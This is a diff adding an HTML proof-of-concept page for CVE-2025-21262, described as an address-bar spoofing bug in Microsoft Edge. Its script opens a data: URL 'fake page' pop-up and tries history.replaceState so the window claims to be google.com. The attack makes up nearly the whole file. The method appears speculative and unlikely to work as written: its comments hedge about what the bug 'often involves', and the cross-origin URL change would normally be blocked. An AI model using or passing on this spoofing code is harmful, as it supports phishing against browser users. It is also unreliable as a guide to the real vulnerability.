@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CVE-2025-21262 PoC - UI Spoofing</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .trigger-btn { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #0078d4; color: white; border: none; border-radius: 5px; }
+        #status { margin-top: 20px; color: red; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h1>CVE-2025-21262 Repro</h1>
+    <p>This PoC demonstrates the <b>UI Misrepresentation</b> vulnerability in Microsoft Edge.</p>
+    
+    <!-- User interaction is required for this CVE -->
+    <button class="trigger-btn" onclick="triggerSpoof()">Click to Test Spoofing</button>
+    
+    <div id="status"></div>
+
+    <script>
+        function triggerSpoof() {
+            document.getElementById('status').innerText = "Attempting to spoof address bar...";
+            
+            /* 
+               Technical Note: This bug often involves manipulating 'window.open' 
+               with specific character encoding or navigation race conditions 
+               to hide the real URL.
+            */
+            
+            let spoofUrl = "https://www.google.com"; // Targeted spoof address
+            let maliciousPayload = "data:text/html,<html><body><h1>Fake Page</h1></body></html>";
+
+            // Opening a window and immediately navigating or manipulating its state
+            let win = window.open(maliciousPayload, "_blank", "width=500,height=500");
+            
+            if (win) {
+                // Vulnerable versions of Edge might fail to update the URL bar correctly
+                // during rapid state changes or specific frame manipulations.
+                try {
+                    win.history.replaceState(null, "", spoofUrl);
+                } catch(e) {
+                    console.log("Standard security blocked replaceState, checking for UI lag...");
+                }
+            } else {
+                alert("Pop-up blocked! Please allow pop-ups for this PoC to work.");
+            }
+        }
+    </script>
+</body>
+</html>
